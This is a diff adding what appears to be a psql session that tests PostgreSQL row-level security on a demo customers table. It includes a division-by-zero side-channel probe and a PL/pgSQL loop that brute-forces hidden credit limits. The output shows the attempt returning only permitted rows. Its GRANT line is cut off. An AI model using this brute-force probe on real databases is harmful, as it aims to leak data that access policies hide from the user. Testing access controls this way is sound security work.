@@ -1,0 +1,146 @@
+CREATE DATABASE rlsdemo;
+\c rlsdemo
+
+
+CREATE TABLE customers (
+   customer_id     INT PRIMARY KEY,
+   customer_name   TEXT,
+   sales_territory TEXT,
+   credit_limit    INT
+);
+
+
+INSERT INTO customers VALUES
+(801, 'Alice Corp',  'Novelty Shop', 4521),
+(802, 'Bob LLC',     'Novelty Shop', 7800),
+(810, 'Secret Co',   'Other Territory', 9999),
+(811, 'Hidden Inc',  'Other Territory', 1234),
+(812, 'Private Ltd', 'Other Territory', 5555),
+(815, 'Acme Inc',    'Other Territory', 2024);
+
+
+ALTER TABLE customers ENABLE ROW LEVEL SECURITY;
+
+
+CREATE POLICY territory_filter ON customers
+   USING (sales_territory = current_setting('app.sales_territory', true));
+
+
+CREATE ROLE rls_gift_store LOGIN PASSWORD 'test';
+GRANT SELECT ON customers
+
+rlsdemo=# SET ROLE rls_gift_store;
+SET app.sales_territory = 'Novelty Shop';
+
+
+SELECT * FROM customers;
+-- Expected: only 801, 802.
+
+
+RESET ROLE;
+SET
+SET
+customer_id | customer_name | sales_territory | credit_limit
+-------------+---------------+-----------------+--------------
+        801 | Alice Corp    | Novelty Shop    |         4521
+        802 | Bob LLC       | Novelty Shop    |         7800
+(2 rows)
+
+
+RESET
+
+rlsdemo=# SET ROLE rls_gift_store;
+SET app.sales_territory = 'Novelty Shop';
+SELECT customer_id, credit_limit
+FROM customers
+WHERE customer_id = 810
+ AND 1/(credit_limit - 9999) = 0;
+RESET ROLE;
+SET
+SET
+customer_id | credit_limit
+-------------+--------------
+(0 rows)
+RESET
+
+rlsdemo=# SET ROLE rls_gift_store;
+SET app.sales_territory = 'Novelty Shop';
+
+
+EXPLAIN (ANALYZE, VERBOSE)
+SELECT customer_id, credit_limit
+FROM customers
+WHERE customer_id = 810
+ AND 1/(credit_limit - 9999) = 0;
+RESET ROLE;
+SET
+SET                                                               QUERY PLAN                                                                 
+----------------------------------------------------------------------------------------------------------------------------------------------
+Index Scan using customers_pkey on public.customers  (cost=0.15..8.18 rows=1 width=8) (actual time=0.144..0.144 rows=0.00 loops=1)
+  Output: customer_id, credit_limit
+  Index Cond: (customers.customer_id = 810)
+  Filter: ((customers.sales_territory = current_setting('app.sales_territory'::text, true)) AND ((1 / (customers.credit_limit - 9999)) = 0))
+  Rows Removed by Filter: 1
+  Index Searches: 1
+  Buffers: shared hit=2
+Planning Time: 0.262 ms
+Execution Time: 0.187 ms
+(9 rows)
+RESET
+
+rlsdemo=# SET ROLE rls_gift_store;
+SET app.sales_territory = 'Novelty Shop';
+
+
+DROP TABLE IF EXISTS attack_results;
+CREATE TEMP TABLE attack_results (customer_id int, credit_limit int, source text);
+
+
+DO $$
+DECLARE
+   cust_id INT;
+   credit  INT;
+   found_row RECORD;
+   already_known INT[];
+BEGIN
+   FOR found_row IN SELECT customer_id, credit_limit FROM customers LOOP
+       INSERT INTO attack_results VALUES (found_row.customer_id, found_row.credit_limit, 'legit');
+   END LOOP;
+
+
+   SELECT array_agg(customer_id) INTO already_known FROM attack_results;
+
+
+   FOR cust_id IN 801..820 LOOP
+       CONTINUE WHEN already_known @> ARRAY[cust_id];
+       credit := 0;
+       WHILE credit < 10000 LOOP
+           BEGIN
+               PERFORM 1 FROM customers
+               WHERE customer_id = cust_id
+                 AND 1/(credit_limit - credit) = 0;
+           EXCEPTION WHEN division_by_zero THEN
+               INSERT INTO attack_results VALUES (cust_id, credit, 'leaked_eq');
+               EXIT;
+           END;
+           credit := credit + 1;
+       END LOOP;
+   END LOOP;
+END $$;
+
+
+SELECT * FROM attack_results ORDER BY customer_id;
+
+
+RESET ROLE;
+SET
+SET
+DROP TABLE
+CREATE TABLE
+DO
+customer_id | credit_limit | source
+-------------+--------------+--------
+        801 |         4521 | legit
+        802 |         7800 | legit
+(2 rows)
+RESET
